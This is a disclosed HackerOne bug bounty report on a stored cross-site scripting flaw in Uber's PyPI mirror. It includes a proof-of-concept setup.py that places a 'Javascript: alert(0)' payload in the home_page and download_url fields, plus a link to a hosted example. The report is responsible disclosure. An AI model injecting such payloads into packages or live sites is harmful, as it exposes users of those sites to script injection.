@@ -1,0 +1,46 @@
+ReportLink:https://hackerone.com/reports/126906
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/ddworken
+ReportedTo:Uber(uber)
+BountyAmount:3000.0
+Severity:
+State:Closed
+DateOfDisclosure:09.05.2016 22:31:09
+
+Summary:
+
+archive.uber.com is vulnerable to an XSS due to injection of Javascript:alert(0) as the ```download_url``` or the ```home_page``` in the ```setup.py``` when generating the ```.tar.gz```. As of [PEP 0470](https://www.python.org/dev/peps/pep-0470/), the ```download_url``` and ```home_page``` parameters are depreciated. 
+
+An example of a setup.py that can exploit this is: 
+
+``` python
+from distutils.core import setup
+
+setup(
+    name='IgnoreMe_mime',
+    version='1.0.2',
+    author='David Dworken',
+    author_email='david@daviddworken.com',
+    packages=['IgnoreMe_mime'],
+    home_page='Javascript: alert(0)',
+    download_url='Javascript: alert(0)',
+    url='http://pypi.python.org/pypi/IgnoreMe_mime/',
+    license='LICENSE.txt',
+    description='XSS!',
+    long_description=open('README.rst').read(),
+    scripts=['uberPip/nothing.py'],
+)
+```
+
+As with #126197, my PoC will be active once you run the mirror process to update archive.uber.com from pypi. Conveniently enough,, it looks like this was historically exploited on pypi, so a PoC (not mine) is already hosted on archive.uber.com here: 
+
+```
+http://archive.uber.com/pypi/simple/ignore-me-1.0/
+```
+
+In order to see the alert(0) box you have to click on the link titled ```1 home_page```. This will work in all browsers as it is a persistent XSS rather than a reflected one. 
+
+This XSS was inadvertently fixed by [PEP 0470](https://www.python.org/dev/peps/pep-0470/) which removed the ```download_url``` and ```home_page``` parameters. In order to fix this, all you have to do is upgrade the software you use to host the mirror since this was fixed upstream. 
+
+Thanks,
+David Dworken
